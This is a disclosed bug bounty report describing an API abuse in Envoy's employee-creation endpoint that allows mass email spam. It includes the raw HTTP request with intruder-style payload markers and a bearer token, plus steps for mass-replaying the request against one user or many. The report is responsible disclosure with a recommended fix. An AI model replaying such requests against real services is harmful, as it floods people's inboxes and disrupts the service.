@@ -1,0 +1,103 @@
+ReportLink:https://hackerone.com/reports/165989
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/zephrfish
+ReportedTo:Envoy(envoy)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:08.12.2016 21:16:01
+
+Summary:
+
+###Issue Description
+The researcher identified that it is possible to abuse the manual creation of employees via the api, meaning that a malicious attacker can create a trial account and use this to mass spam users' with emails, the screenshot below shows the mass amount of emails that can be sent in a short period of time. 
+
+{F117503}
+
+From the screenshot it can be identified that several hundred emails have been received in a short space of time to the same address. This results in mass spam being possible via the feature.
+**Note: It was identified that to an extent there was rate limiting however, the requests would become queued, meaning that the mass emails would still send, just due to the queuing it was in batches of 100 at a time.**
+
+
+
+###Affected URLs
+
+ - https://dashboard.envoy.com/employees
+ - https://dashboard.envoy.com/employees/new [Creation of New Employee Manually]
+
+####Affected Request
+
+    POST /api/v2/employees HTTP/1.1
+    Host: app.envoy.com
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+    Accept: application/vnd.api+json
+    Content-Type: application/vnd.api+json
+    Authorization: Bearer ed2e1ed93f683acb3d11b7f411ca1d1a289442205782375ebe1a9ae650e93fc1
+    Referer: https://dashboard.envoy.com/employees/new
+    ---snip---
+    
+    {"data":{"attributes":{"name":"§AAAAAA§","email":§null§,"phone-number":null,"created-at":null,"cc-employee":false,"do-not-sync":false,"deleted":false},"relationships":{"user":{"data":null},"company":{"data":{"type":"companies","id":"12737"}},"locations":{"data":[{"type":"locations","id":"14696"}]},"assistants":{"data":[]},"bosses":{"data":[]}},"type":"employees"}}
+
+####Affiliated Response
+
+    HTTP/1.1 201 Created
+    Date: Mon, 05 Sep 2016 20:57:42 GMT
+    Content-Type: application/json; charset=utf-8
+    Connection: close
+    Set-Cookie: __cfduid=de855150f4dc328040e3ef7d906dbba8f1473109061; expires=Tue, 05-Sep-17 20:57:41 GMT; path=/; domain=.envoy.com; HttpOnly
+    Status: 201 Created
+    ---snip---
+    
+    {"data":{"id":"3611180","type":"employees","attributes":{"name":"AAAAAA","email":"","phone-number":null,"profile-picture-url":null,"created-at":"2016-09-05T20:57:42.273Z","do-not-sync":false,"is-deleted":false,"deleted":false,"cc-employee":false},"relationships":{"company":{"data":{"type":"companies","id":"12737"}},"locations":{"data":[{"type":"locations","id":"14696"}]},"user":{"links":{"related":"https://app.envoy.com/api/v2/employees/3611180/user"}},"bosses":{"data":[]},"assistants":{"data":[]}}},"links":{"self":"https://app.envoy.com/api/v2/employees/3611180"}}
+
+###Risk Breakdown
+Risk: **Medium**
+Difficulty to Exploit: **Medium** 
+Authentication: **Yes, to API**
+
+###Steps to Reproduce
+{F117500}
+{F117499}
+Step 1: Create Account on Envoy
+Step 2: Navigate to *https://dashboard.envoy.com/employees*
+Step 3: Select *Add Employee Manually*
+Step 4: Enter Details in for Employee as Demonstrated
+Step 5: Trap request in a Proxy, in this case burp has been used:
+{F117498}
+{F117497}
+####Affected Request
+
+    POST /api/v2/employees HTTP/1.1
+    Host: app.envoy.com
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+    Accept: application/vnd.api+json
+    Accept-Language: en-GB,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Content-Type: application/vnd.api+json
+    Authorization: Bearer ed2e1ed93f683acb3d11b7f411ca1d1a289442205782375ebe1a9ae650e93fc1
+    Referer: https://dashboard.envoy.com/employees/new
+    Content-Length: 362
+    Origin: https://dashboard.envoy.com
+    Connection: close
+    
+    {"data":{"attributes":{"name":"§AAAAAA§","email":§null§,"phone-number":null,"created-at":null,"cc-employee":false,"do-not-sync":false,"deleted":false},"relationships":{"user":{"data":null},"company":{"data":{"type":"companies","id":"12737"}},"locations":{"data":[{"type":"locations","id":"14696"}]},"assistants":{"data":[]},"bosses":{"data":[]}},"type":"employees"}}
+
+Specifically in the request the "name" and "email" fields are the target of this attack where an attacker can supply arbitrary values.
+
+
+
+Step 6: Mass replay the request, this can be done either to one email address to cause a DoS to One user, OR a mass amount of emails can be substituted into the request. 
+{F117496}
+Mass DoS One User
+{F117495}
+Mass Email Attack Multiple Users
+
+###Affected Demographic
+Potentially random users/targeted attacks against individuals. 
+
+###Recommended Fix 
+Implement additional checking per API request such as a unique token or identifier that changes per request to prevent mass spamming via manual addition of employees. Additional Rate limiting measures can be implemented such as IP blacklisting, or account banning if a certain amount of requests are made. 
+
+
+###References
+
+ 1. [Reduce Bruting](https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks)
